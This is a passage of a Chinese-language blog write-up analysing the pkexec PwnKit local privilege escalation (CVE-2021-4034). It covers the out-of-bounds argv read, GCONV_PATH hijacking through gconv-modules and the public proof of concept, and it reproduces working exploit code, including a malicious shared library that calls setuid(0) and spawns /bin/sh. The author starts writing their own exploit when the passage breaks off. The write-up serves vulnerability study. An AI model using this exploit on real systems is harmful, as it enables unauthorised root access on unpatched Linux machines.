class=\"string\">&quot;AAAA1111&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;BBBB2222&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;CCCC3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> envp[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDD3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;EEEE4444&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFF5555&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">execve</span>(<span class=\"string\">&quot;./test&quot;</span>, argv, envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"testc\"><a class=\"markdownIt-Anchor\" href=\"#testc\">#</a> test.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argc: %d\\n&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i; i&lt;<span class=\"number\">8</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(argv[i]!=<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: %s\\n&quot;</span>, i, argv[i]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: NULL\\n&quot;</span>, i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">3</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: AAAA1111</span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: BBBB2222</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: CCCC3333</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">5</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">6</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">7</span>]: <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n<p>argc 是自动计算的</p>\n<h4 id=\"agrv不传入的情况\"><a class=\"markdownIt-Anchor\" href=\"#agrv不传入的情况\">#</a> agrv 不传入的情况？</h4>\n<p>修改为 <code>char* const argv[] = &#123;NULL&#125;</code> <br>\n 就没有 argc 了，而 <code>argv[1]</code>  是 <code>environ[0]</code></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">0</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: FFFF5555</span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: <span class=\"function\"><span class=\"literal\">NULL</span></span></span><br><span class=\"line\"><span class=\"function\">Segmentation <span class=\"title\">fault</span> <span class=\"params\">(core dumped)</span></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"关于调用iconv的办法\"><a class=\"markdownIt-Anchor\" href=\"#关于调用iconv的办法\">#</a> 关于调用 iconv 的办法</h3>\n<p>如果劫持了 <code>GCONV_PATH</code>  就需要调用 <code>iconv()</code>  才行，在 <code>pkexec.c</code>  源码 369 行位置</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> gboolean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">validate_environment_variable</span> <span class=\"params\">(<span class=\"type\">const</span> gchar *key,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                               <span class=\"type\">const</span> gchar *value)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  gboolean ret;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Generally we bail if any environment variable value contains</span></span><br><span class=\"line\"><span class=\"comment\">   *</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;/&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;%&#x27; characters</span></span><br><span class=\"line\"><span class=\"comment\">   *   - &#x27;..&#x27; substrings</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (key != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">  <span class=\"built_in\">g_return_val_if_fail</span> (value != <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;XAUTHORITY&quot;</span>) != <span class=\"number\">0</span> &amp;&amp; <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;/&quot;</span>) != <span class=\"literal\">NULL</span>) ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;%&quot;</span>) != <span class=\"literal\">NULL</span> ||</span><br><span class=\"line\">           <span class=\"built_in\">strstr</span> (value, <span class=\"string\">&quot;..&quot;</span>) != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                   <span class=\"string\">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class=\"line\">                   key);</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                  <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">g_strcmp0</span> (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_valid_shell</span> (value)) <span class=\"comment\">// SHELL值不合法 调用g_printerr</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">log_message</span> (LOG_CRIT, TRUE,</span><br><span class=\"line\">                     <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                    <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>如果构造了一个错误的 <code>SHELL</code>  环境变量，就会调用 <code>g_printerr</code> （当然也可以利用 <code>XAUTHORITY</code>  来打）<br>\n而 <code>g_printerr</code>  默认是 <code>UTF-8</code>  格式，他会检查 <code>CHARSET</code>  变量，对输出格式进行转码，就会调用 <code>iconv</code> ，然后 <code>iconv</code>  会调用 <code>iconv_open</code>  初始化， <code>iconv_open</code>  会根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code>  文件，再根据 <code>gconv-modules</code>  文件的指示找到参数对应字符集的 so 库，调用 so 库中的 <code>gconv()</code>  和 <code>gonv_init()</code>  函数。</p>\n<h2 id=\"利用方法\"><a class=\"markdownIt-Anchor\" href=\"#利用方法\">#</a> 利用方法</h2>\n<ol>\n<li>创建一个 <code>GCONV_PATH=.</code>  的目录</li>\n<li>在上面目录下创建我们的恶意库</li>\n<li>在本目录下创建 <code>gconv-modules</code>  文件，写入 <code>module UTF-8// PWNKIT// pwnkit 1</code></li>\n<li>设置环境变量\n<ol>\n<li>第一个是恶意库 <code>pwnkit.so:.</code></li>\n<li>第二个环境变量  <code>PATH=GCONV_PATH=.</code>  这样  <code>g_find_program_in_path</code>  函数组合出的路径就是 <code>GCONV_PATH=./pwnkit.so:.</code>  （ <code>PATH</code> + <code>NAME</code> = <code>GCONV_PATH=.</code> + <code>/</code> + <code>pwnkit.so:.</code> ）</li>\n<li><code>CHARSET=PWNKIT</code> ，指定字符集为 <code>pwnkit</code></li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>如环境变量 “PATH=name”，如果 name 目录存在，并且 name 目录下也有 value 可执行程序，那么 envp [0] 的便指向 name/value；<br>\n如环境变量设置为 “PATH=name=.”，并且 “name=.” 目录下也有 value 可执行程序，那么 envp [0] 的便指向 “name=./value”。</p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  argv[n] = path;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对环境变量的回写</p>\n<h3 id=\"流程\"><a class=\"markdownIt-Anchor\" href=\"#流程\">#</a> 流程</h3>\n<ol>\n<li>execve 执行 pkexec，无参传入，造成越界错误执行 <code>environ[0]</code></li>\n<li>612 行 argv [1] 越界访问的是 envp [0]，获取到 value 值，和 path 组合后写回；（实现了一次找到路径的写入）此时 <code>GCONV_PATH</code>  已经被篡改</li>\n<li>检测到 <code>SHELL</code>  变量问题，调用 <code>g_printerr</code></li>\n<li>根据 <code>CHARSET</code>  变量，需要转码，调用 <code>iconv</code> ，然后 <code>iconv_open</code></li>\n<li>根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code> , 然后找到我们的恶意库</li>\n<li>调用函数 <code>gonv_init()</code> , 提权拿下！</li>\n</ol>\n<h2 id=\"gconv_path漏洞demo\"><a class=\"markdownIt-Anchor\" href=\"#gconv_path漏洞demo\">#</a> GCONV_PATH 漏洞 demo</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// file name hack.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you be hacked alreadly!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export CHARSET=HACK</span><br><span class=\"line\">export GCONV_PATH=.</span><br><span class=\"line\"></span><br><span class=\"line\">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class=\"line\">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure>\n<p>这样就布置好了所有准备，然后手动调用 <code>iconv</code> ，虽然我想用 <code>g_printerr</code> ? 但是编译不通？？<br>\nhacked！</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class=\"line\">you be hacked alreadly!</span><br><span class=\"line\">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class=\"line\">Aborted (core dumped)</span><br></pre></td></tr></table></figure>\n<h3 id=\"module语法\"><a class=\"markdownIt-Anchor\" href=\"#module语法\">#</a> module 语法</h3>\n<p><a href=\"https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html\">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module AAAA// BBBB// name 1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从 AAAA编码到 BBBB编码 根据name.so规则 消耗cast值为1</span></span><br></pre></td></tr></table></figure>\n<p>然后 <code>iconv</code>  不知道 <code>CHARSET</code>  中的 <code>HACK</code>  是什么字符集，就会找到 <code>GCONV_PATH</code>  路径下的 <code>gconv_modules</code>  去找解码工具，然后就落入我们的恶意库了，所以能控制 <code>GCONV_PATH</code>  就能恶意代码执行</p>\n<h2 id=\"分析poc\"><a class=\"markdownIt-Anchor\" href=\"#分析poc\">#</a> 分析 POC</h2>\n<h3 id=\"make做的事\"><a class=\"markdownIt-Anchor\" href=\"#make做的事\">#</a> make 做的事</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class=\"line\">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class=\"line\">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class=\"line\">mkdir -p GCONV_PATH=.</span><br><span class=\"line\">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure>\n<p>先是在当前目录下生成了 <code>pwnkit.so</code>  的库<br>\n然后编译了 <code>cve-2021-4034</code> <br>\n 然后传入一句话给 <code>gconv-modules</code> <br>\n 创建一个文件夹，名字为 <code>GCONV_PATH=.</code> <br>\n 最后 cp <code>/usr/bin/true</code>  到 <code>GCONV_PATH=.</code>  文件夹路径下的 <code>pwnkit.so:.</code>  里去 <code>-f</code>  是 force 强制把 <code>/usr/bin/true</code>  这个文件 cp 到目标路径，因为 <code>pkexec</code>  要执行 <code>PATH</code>  路径下的第一个参数，就必须让 pkexec 空执行，所以目标就被替换成 <code>true</code> ，怎么执行都不会出错<br>\n当前目录结构</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── cve-2021-4034.c</span><br><span class=\"line\">├── cve-2021-4034.sh</span><br><span class=\"line\">├── dry-run</span><br><span class=\"line\">│   ├── dry-run-cve-2021-4034.c</span><br><span class=\"line\">│   ├── Makefile</span><br><span class=\"line\">│   └── pwnkit-dry-run.c</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── Makefile</span><br><span class=\"line\">├── pwnkit.c</span><br><span class=\"line\">└── README.md</span><br></pre></td></tr></table></figure>\n<p>make 之后的</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── cve-2021-4034</span><br><span class=\"line\">├── cve-2021-4034.c</span><br><span class=\"line\">├── cve-2021-4034.sh</span><br><span class=\"line\">├── dry-run</span><br><span class=\"line\">│   ├── dry-run-cve-2021-4034.c</span><br><span class=\"line\">│   ├── Makefile</span><br><span class=\"line\">│   └── pwnkit-dry-run.c</span><br><span class=\"line\">├── gconv-modules</span><br><span class=\"line\">├── GCONV_PATH=.</span><br><span class=\"line\">│   └── pwnkit.so:.</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── Makefile</span><br><span class=\"line\">├── pwnkit.c</span><br><span class=\"line\">├── pwnkit.so</span><br><span class=\"line\">└── README.md</span><br></pre></td></tr></table></figure>\n<h3 id=\"cve-2021-4034c\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-4034c\">#</a> cve-2021-4034.c</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include &lt;unistd.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char **argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar * const args[] = &#123;</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tchar * const environ[] = &#123;</span><br><span class=\"line\">\t\t&quot;pwnkit.so:.&quot;,</span><br><span class=\"line\">\t\t&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class=\"line\">\t\t&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class=\"line\">\t\t&quot;CHARSET=PWNKIT&quot;,</span><br><span class=\"line\">\t\t&quot;GIO_USE_VFS=&quot;,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\treturn execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第一个环境变量指向 <code>pwnkit.so:.</code> ，拼接后就是 <code>GCONV_PATH=./pwnkit.so:.</code> <br>\n <code>:</code>  的作用我在网上都没查到很好的介绍，我理解为二级指针会遍历由 <code>:</code>  分割的路径，，，<br>\n也就是第二轮循环会变成 <code>GCONV_PATH=.</code> ，引导向当时的恶意库</p>\n<h3 id=\"pwnkitc\"><a class=\"markdownIt-Anchor\" href=\"#pwnkitc\">#</a> pwnkit.c</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> args[] = &#123; <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> * <span class=\"type\">const</span> environ[] = &#123; <span class=\"string\">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>], args, environ);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个就是伪造的 <code>gconv-mudules</code>  下的 <code>so</code>  文件，会执行 <code>gconv</code>  和 <code>gconv_init</code> <br>\n 这个 <code>PATH</code>  就是多个可能的 bin 目标依次遍历<br>\n这就是 shellcode 了<br>\n关于这个 <code>setuid</code>  和 <code>setgid</code>  我重新开一章分析</p>\n<h2 id=\"尾声\"><a class=\"markdownIt-Anchor\" href=\"#尾声\">#</a> 尾声</h2>\n<p>既然自己分析完了，就要自己写利用脚本<br>\n首先是恶意库</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span 